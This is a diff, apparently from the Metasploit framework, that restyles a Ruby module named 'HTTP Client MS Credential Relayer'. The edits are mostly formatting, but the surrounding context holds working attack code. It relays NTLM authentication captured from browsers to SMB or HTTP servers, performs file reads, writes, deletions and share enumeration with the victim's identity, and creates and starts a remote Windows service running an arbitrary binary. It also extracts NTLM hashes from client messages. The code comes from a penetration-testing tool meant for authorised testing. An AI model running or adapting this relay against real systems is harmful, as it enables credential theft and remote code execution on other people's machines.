@@ -5,7 +5,6 @@
 
 require 'rex/exceptions'
 
-
 NTLM_CONST = Rex::Proto::NTLM::Constants
 NTLM_CRYPT = Rex::Proto::NTLM::Crypt
 MESSAGE = Rex::Proto::NTLM::Message
@@ -16,14 +15,16 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
 
   # Aliases for common classes
-  XCEPT  = Rex::Proto::SMB::Exceptions
-  CONST  = Rex::Proto::SMB::Constants
+  XCEPT = Rex::Proto::SMB::Exceptions
+  CONST = Rex::Proto::SMB::Constants
   NDR = Rex::Encoder::NDR
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'        => 'HTTP Client MS Credential Relayer',
-      'Description' => %q{
+    super(
+      update_info(
+        info,
+        'Name' => 'HTTP Client MS Credential Relayer',
+        'Description' => %q{
           This module relays negotiated NTLM Credentials from an HTTP server to multiple
           protocols. Currently, this module supports relaying to SMB and HTTP.
 
@@ -35,26 +36,34 @@ class MetasploitModule < Msf::Auxiliary
           or authentication cookies, setting these as configuration options, and finally
           create a web page with iframe elements pointing at the HTTP_GET and HTTP_POSTs.
         },
-      'Author'      =>
-        [
+        'Author' => [
           'Rich Lundeen <richard.lundeen[at]gmail.com>',
         ],
-      'License'     => MSF_LICENSE,
-      'Actions'     =>
-        [
+        'License' => MSF_LICENSE,
+        'Actions' => [
           [ 'WebServer', 'Description' => 'Start web server waiting for incoming authenticated connections' ]
         ],
-      'PassiveActions' =>
-        [
+        'PassiveActions' => [
           'WebServer'
         ],
-      'DefaultAction'  => 'WebServer'))
+        'DefaultAction' => 'WebServer',
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
     register_options([
       OptBool.new('RSSL', [true, "SSL on the remote connection ", false]),
-      OptEnum.new('RTYPE', [true, "Type of action to perform on remote target", "HTTP_GET",
-        [   "HTTP_GET", "HTTP_POST", "SMB_GET", "SMB_PUT", "SMB_RM", "SMB_ENUM",
-          "SMB_LS", "SMB_PWN" ]]),
+      OptEnum.new('RTYPE', [
+        true, "Type of action to perform on remote target", "HTTP_GET",
+        [
+          "HTTP_GET", "HTTP_POST", "SMB_GET", "SMB_PUT", "SMB_RM", "SMB_ENUM",
+          "SMB_LS", "SMB_PWN"
+        ]
+      ]),
       OptString.new('RURIPATH', [true, "The path to relay credentials ", "/"]),
       OptString.new('PUTDATA', [false, "This is the HTTP_POST or SMB_PUT data" ]),
       OptPath.new('FILEPUTDATA', [false, "PUTDATA, but specified by a local file" ]),
@@ -64,21 +73,26 @@ class MetasploitModule < Msf::Auxiliary
     ])
 
     register_advanced_options([
-      OptPath.new('RESPPAGE', [false,
-        'The file used for the server response. (Image extensions matter)', nil]),
-      OptPath.new('HTTP_HEADERFILE', [false,
-        'File specifying extra HTTP_* headers (cookies, multipart, etc.)', nil]),
-      OptString.new('SMB_SHARES', [false, 'The shares to check with SMB_ENUM',
-              'IPC$,ADMIN$,C$,D$,CCMLOGS$,ccmsetup$,share,netlogon,sysvol'])
+      OptPath.new('RESPPAGE', [
+        false,
+        'The file used for the server response. (Image extensions matter)', nil
+      ]),
+      OptPath.new('HTTP_HEADERFILE', [
+        false,
+        'File specifying extra HTTP_* headers (cookies, multipart, etc.)', nil
+      ]),
+      OptString.new('SMB_SHARES', [
+        false, 'The shares to check with SMB_ENUM',
+        'IPC$,ADMIN$,C$,D$,CCMLOGS$,ccmsetup$,share,netlogon,sysvol'
+      ])
     ])
 
     deregister_options('DOMAIN', 'NTLM::SendLM', 'NTLM::SendSPN', 'NTLM::SendNTLM', 'NTLM::UseLMKey',
-      'NTLM::UseNTLM2_session', 'NTLM::UseNTLMv2')
+                       'NTLM::UseNTLM2_session', 'NTLM::UseNTLMv2')
   end
 
   # Handles the initial requests waiting for the browser to try NTLM auth
   def on_request_uri(cli, request)
-
     case request.method
     when 'OPTIONS'
       process_options(cli, request)
@@ -86,7 +100,7 @@ class MetasploitModule < Msf::Auxiliary
       cli.keepalive = true;
 
       # If the host has not started auth, send 401 authenticate with only the NTLM option
-      if(!request.headers['Authorization'])
+      if (!request.headers['Authorization'])
         response = create_response(401, "Unauthorized")
         response.headers['WWW-Authenticate'] = "NTLM"
         response.headers['Proxy-Support'] = 'Session-Based-Authentication'
@@ -97,10 +111,10 @@ class MetasploitModule < Msf::Auxiliary
         cli.send_response(response)
         return false
       end
-      method,hash = request.headers['Authorization'].split(/\s+/,2)
+      method, hash = request.headers['Authorization'].split(/\s+/, 2)
       # If the method isn't NTLM something odd is going on.
       # Regardless, this won't get what we want, 404 them
-      if(method != "NTLM")
+      if (method != "NTLM")
         print_status("Unrecognized Authorization header, responding with 404")
         send_not_found(cli)
         return false
@@ -112,7 +126,7 @@ class MetasploitModule < Msf::Auxiliary
         sync_options()
       end
 
-      handle_relay(cli,hash)
+      handle_relay(cli, hash)
     end
   end
 
@@ -125,14 +139,14 @@ class MetasploitModule < Msf::Auxiliary
     print_status("OPTIONS #{request.uri}")
     headers = {
       'MS-Author-Via' => 'DAV',
-      'DASL'          => '<DAV:sql>',
-      'DAV'           => '1, 2',
-      'Allow'         => 'OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH',
-      'Public'        => 'OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK',
+      'DASL' => '<DAV:sql>',
+      'DAV' => '1, 2',
+      'Allow' => 'OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH',
+      'Public' => 'OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK',
       'Cache-Control' => 'private'
     }
     resp = create_response(207, "Multi-Status")
-    headers.each_pair {|k,v| resp[k] = v }
+    headers.each_pair { |k, v| resp[k] = v }
     resp.body = ""
     resp['Content-Type'] = 'text/xml'
     cli.send_response(resp)
@@ -144,21 +158,21 @@ class MetasploitModule < Msf::Auxiliary
     message = Rex::Text.decode_base64(hash)
     # get type of message, which will be HTTP, SMB, ...
     protocol = datastore['RTYPE'].split('_')[0]
-    if(message[8,1] != "\x03")
+    if (message[8, 1] != "\x03")
       # Relay NTLMSSP_NETOTIATE from client to server (type 1)
       case protocol
-        when 'HTTP'
-          resp, ser_sock = http_relay_toserver(hash)
-          if resp.headers["WWW-Authenticate"]
-            t2hash = resp.headers["WWW-Authenticate"].split(" ")[1]
-          else
-            print_error "#{rhost} is not requesting authentication."
-            cli_sock.close
-            ser_sock.close
-            return false
-          end
-        when 'SMB'
-          t2hash, ser_sock = smb_relay_toservert1(hash)
+      when 'HTTP'
+        resp, ser_sock = http_relay_toserver(hash)
+        if resp.headers["WWW-Authenticate"]
+          t2hash = resp.headers["WWW-Authenticate"].split(" ")[1]
+        else
+          print_error "#{rhost} is not requesting authentication."
+          cli_sock.close
+          ser_sock.close
+          return false
+        end
+      when 'SMB'
+        t2hash, ser_sock = smb_relay_toservert1(hash)
       end
       # goes along with above, resp is now just the hash
       client_respheader = "NTLM " << t2hash
@@ -176,34 +190,34 @@ class MetasploitModule < Msf::Auxiliary
       # Get the type 3 hash from the client and relay to the server
       cli_type3Data = cli_sock.get_once(-1, 5)
       begin
-        cli_type3Header = cli_type3Data.split(/\r\nAuthorization:\s+NTLM\s+/,2)[1]
-        cli_type3Hash = cli_type3Header.split(/\r\n/,2)[0]
+        cli_type3Header = cli_type3Data.split(/\r\nAuthorization:\s+NTLM\s+/, 2)[1]
+        cli_type3Hash = cli_type3Header.split(/\r\n/, 2)[0]
       rescue ::NoMethodError
         print_error("Error: Type3 hash not relayed.")
         cli_sock.close()
         return false
       end
       case protocol
-        when 'HTTP'
-          resp, ser_sock = http_relay_toserver(cli_type3Hash, ser_sock)
-        when 'SMB'
-          ser_sock = smb_relay_toservert3(cli_type3Hash, ser_sock)
-          # perform authenticated action
-          action = datastore['RTYPE'].split('_')[1]
-          case action
-            when 'GET'
-              resp = smb_get(ser_sock)
-            when 'PUT'
-              resp = smb_put(ser_sock)
-            when 'RM'
-              resp = smb_rm(ser_sock)
-            when 'ENUM'
-              resp = smb_enum(ser_sock)
-            when 'LS'
-              resp = smb_ls(ser_sock)
-            when 'PWN'
-              resp = smb_pwn(ser_sock, cli_sock)
-          end
+      when 'HTTP'
+        resp, ser_sock = http_relay_toserver(cli_type3Hash, ser_sock)
+      when 'SMB'
+        ser_sock = smb_relay_toservert3(cli_type3Hash, ser_sock)
+        # perform authenticated action
+        action = datastore['RTYPE'].split('_')[1]
+        case action
+        when 'GET'
+          resp = smb_get(ser_sock)
+        when 'PUT'
+          resp = smb_put(ser_sock)
+        when 'RM'
+          resp = smb_rm(ser_sock)
+        when 'ENUM'
+          resp = smb_enum(ser_sock)
+        when 'LS'
+          resp = smb_ls(ser_sock)
+        when 'PWN'
+          resp = smb_pwn(ser_sock, cli_sock)
+        end
       end
       report_info(resp, cli_type3Hash)
 
@@ -261,7 +275,7 @@ class MetasploitModule < Msf::Auxiliary
 
     method = datastore['RTYPE'].split('_')[1]
     theaders = ('Authorization: NTLM ' << hash << "\r\n" <<
-          "Connection: Keep-Alive\r\n" )
+          "Connection: Keep-Alive\r\n")
 
     # HTTP_HEADERFILE is how this module supports cookies, multipart forms, etc
     if datastore['HTTP_HEADERFILE'] != nil
@@ -272,16 +286,17 @@ class MetasploitModule < Msf::Auxiliary
         raise ArgumentError
       end
       # read file line by line to deal with any dos/unix ending ambiguity
-      File.readlines(datastore['HTTP_HEADERFILE']).each do|header|
+      File.readlines(datastore['HTTP_HEADERFILE']).each do |header|
         next if header.strip == ''
+
         theaders << (header) << "\r\n"
       end
     end
 
     opts = {
-    'uri'     => normalize_uri(datastore['RURIPATH']),
-    'method'  => method,
-    'version' => '1.1',
+      'uri' => normalize_uri(datastore['RURIPATH']),
+      'method' => method,
+      'version' => '1.1',
     }
     if (@finalputdata != nil)
       # we need to get rid of an extra "\r\n"
@@ -314,11 +329,11 @@ class MetasploitModule < Msf::Auxiliary
     rsock = Rex::Socket::Tcp.create(
       'PeerHost' => datastore['RHOST'],
       'PeerPort' => datastore['RPORT'],
-      'Timeout'  => 3,
-      'Context'  =>
+      'Timeout' => 3,
+      'Context' =>
         {
-          'Msf'       => framework,
-          'MsfExploit'=> self,
+          'Msf' => framework,
+          'MsfExploit' => self,
         }
     )
     if (not rsock)
@@ -341,10 +356,10 @@ class MetasploitModule < Msf::Auxiliary
     ser_sock.client.auth_user_id = resp['Payload']['SMB'].v['UserID']
 
     begin
-      #lazy ntlmsspblob extraction
+      # lazy ntlmsspblob extraction
       ntlmsspblob = 'NTLMSSP' <<
-              (resp.to_s().split('NTLMSSP')[1].split("\x00\x00Win")[0]) <<
-              "\x00\x00"
+                    (resp.to_s().split('NTLMSSP')[1].split("\x00\x00Win")[0]) <<
+                    "\x00\x00"
     rescue ::Exception => e
       print_error("Type 2 response not read properly from server")
       raise e
@@ -371,10 +386,10 @@ class MetasploitModule < Msf::Auxiliary
       )
 
     resp = ser_sock.client.session_setup_with_ntlmssp_blob(
-        blob,
-        false,
-        ser_sock.client.auth_user_id
-      )
+      blob,
+      false,
+      ser_sock.client.auth_user_id
+    )
     resp = ser_sock.client.smb_recv_parse(CONST::SMB_COM_SESSION_SETUP_ANDX, true)
 
     # check if auth was successful
@@ -458,14 +473,13 @@ class MetasploitModule < Msf::Auxiliary
     )
 
     if datastore["VERBOSE"]
-      files.each {|filename| print_status("    #{filename[0]}")}
+      files.each { |filename| print_status("    #{filename[0]}") }
     end
     return files
   end
 
   # start a service. This method copies a lot of logic/code from psexec (and smb_relay)
   def smb_pwn(ser_sock, cli_sock)
-
     # filename is a little finicky, it needs to be in a format like
     # "%SystemRoot%\\system32\\calc.exe" or "\\\\host\\c$\\WINDOWS\\system32\\calc.exe
     filename = datastore['RURIPATH']
@@ -489,7 +503,7 @@ class MetasploitModule < Msf::Auxiliary
     begin
       response = dcerpc.call(0x0f, stubdata)
       if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
-        scm_handle = dcerpc.last_response.stub_data[0,20]
+        scm_handle = dcerpc.last_response.stub_data[0, 20]
       end
     rescue ::Exception => e
       print_error("Error: #{e}")
@@ -499,7 +513,7 @@ class MetasploitModule < Msf::Auxiliary
     print_status("Creating a new service")
 
     servicename = Rex::Text::rand_text_alpha(8)
-    displayname = Rex::Text::rand_text_alpha(rand(32)+1)
+    displayname = Rex::Text::rand_text_alpha(rand(32) + 1)
     svc_handle = nil
 
     stubdata =
@@ -510,7 +524,6 @@ class MetasploitModule < Msf::Auxiliary
       NDR.long(0x00000110) + # Type: Interactive, Own process
       NDR.long(0x00000003) + # Start: Demand
       NDR.long(0x00000000) + # Errors: Ignore
-
       NDR.wstring(filename) + # Binary Path
       NDR.long(0) + # LoadOrderGroup
       NDR.long(0) + # Dependencies
@@ -521,14 +534,14 @@ class MetasploitModule < Msf::Auxiliary
       NDR.long(0)   # Password
 
     begin
-        response = dcerpc.call(0x0c, stubdata)
-        if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
-            svc_handle = dcerpc.last_response.stub_data[0,20]
-            #svc_status = dcerpc.last_response.stub_data[24,4]
-        end
+      response = dcerpc.call(0x0c, stubdata)
+      if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
+        svc_handle = dcerpc.last_response.stub_data[0, 20]
+        # svc_status = dcerpc.last_response.stub_data[24,4]
+      end
     rescue ::Exception => e
-        print_error("Error: #{e}")
-        return
+      print_error("Error: #{e}")
+      return
     end
 
     print_status("Closing service handle...")
@@ -540,13 +553,13 @@ class MetasploitModule < Msf::Auxiliary
     print_status("Opening service...")
     begin
       stubdata =
-          scm_handle +
-          NDR.wstring(servicename) +
-          NDR.long(0xF01FF)
+        scm_handle +
+        NDR.wstring(servicename) +
+        NDR.long(0xF01FF)
 
       response = dcerpc.call(0x10, stubdata)
       if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
-        svc_handle = dcerpc.last_response.stub_data[0,20]
+        svc_handle = dcerpc.last_response.stub_data[0, 20]
       end
     rescue ::Exception => e
       print_error("Error: #{e}")
@@ -611,26 +624,28 @@ class MetasploitModule < Msf::Auxiliary
   # mostly taken from http_ntlm module handle_auth function
   def get_hash_info(type3_hash)
     # authorization string is base64 encoded message
-    domain,user,host,lm_hash,ntlm_hash = MESSAGE.process_type3_message(type3_hash)
+    domain, user, host, lm_hash, ntlm_hash = MESSAGE.process_type3_message(type3_hash)
     nt_len = ntlm_hash.length
 
-    if nt_len == 48 #lmv1/ntlmv1 or ntlm2_session
-      arg = { :ntlm_ver => NTLM_CONST::NTLM_V1_RESPONSE,
+    if nt_len == 48 # lmv1/ntlmv1 or ntlm2_session
+      arg = {
+        :ntlm_ver => NTLM_CONST::NTLM_V1_RESPONSE,
         :lm_hash => lm_hash,
         :nt_hash => ntlm_hash
       }
 
-      if arg[:lm_hash][16,32] == '0' * 32
+      if arg[:lm_hash][16, 32] == '0' * 32
         arg[:ntlm_ver] = NTLM_CONST::NTLM_2_SESSION_RESPONSE
       end
     # if the length of the ntlm response is not 24 then it will be bigger and represent
     # a ntlmv2 response
-    elsif nt_len > 48 #lmv2/ntlmv2
-      arg = { :ntlm_ver   => NTLM_CONST::NTLM_V2_RESPONSE,
-        :lm_hash          => lm_hash[0, 32],
+    elsif nt_len > 48 # lmv2/ntlmv2
+      arg = {
+        :ntlm_ver => NTLM_CONST::NTLM_V2_RESPONSE,
+        :lm_hash => lm_hash[0, 32],
         :lm_cli_challenge => lm_hash[32, 16],
-        :nt_hash          => ntlm_hash[0, 32],
-        :nt_cli_challenge => ntlm_hash[32, nt_len  - 32]
+        :nt_hash => ntlm_hash[0, 32],
+        :nt_cli_challenge => ntlm_hash[32, nt_len - 32]
       }
     elsif nt_len == 0
       print_status("Empty hash from #{host} captured, ignoring ... ")
